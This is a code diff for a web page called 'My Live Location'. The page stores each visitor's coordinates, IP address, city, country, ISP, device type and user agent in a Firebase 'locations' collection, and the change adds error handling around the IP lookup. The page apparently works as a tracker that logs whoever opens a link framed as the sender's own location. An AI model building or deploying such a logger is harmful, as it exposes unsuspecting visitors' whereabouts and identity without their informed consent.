@@ -47,7 +47,7 @@ font-size:18px;
 📍 My Live Location
 </header>
 
-<div class="info" id="status">Please Wait...bro</div>
+<div class="info" id="status">Please Wait...</div>
 
 <div id="map"></div>
 
@@ -86,12 +86,33 @@ return "Desktop";
 
 }
 
-async function saveLocation(lat,lon){
+async function saveLocation(lat, lon){
 
-let response = await fetch("https://ipapi.co/json/");
-let data = await response.json();
+let ip="unknown"
+let city="unknown"
+let country="unknown"
+let country_code="unknown"
+let isp="unknown"
 
-let flag = "https://flagcdn.com/48x36/" + data.country_code.toLowerCase() + ".png";
+try{
+
+let response = await fetch("https://ipapi.co/json/",{
+timeout:3000
+})
+
+let data = await response.json()
+
+ip=data.ip
+city=data.city
+country=data.country_name
+country_code=data.country_code
+isp=data.org
+
+}catch(e){
+console.log("IP lookup failed")
+}
+
+let flag="https://flagcdn.com/48x36/"+country_code.toLowerCase()+".png"
 
 await addDoc(collection(db,"locations"),{
 
@@ -99,18 +120,17 @@ latitude:lat,
 longitude:lon,
 time:new Date().toISOString(),
 
-ip:data.ip,
-city:data.city,
-country:data.country_name,
-country_code:data.country_code,
+ip:ip,
+city:city,
+country:country,
+country_code:country_code,
 flag:flag,
-
-isp:data.org,
+isp:isp,
 
 device:detectDevice(),
 userAgent:navigator.userAgent
 
-});
+})
 
 }
 
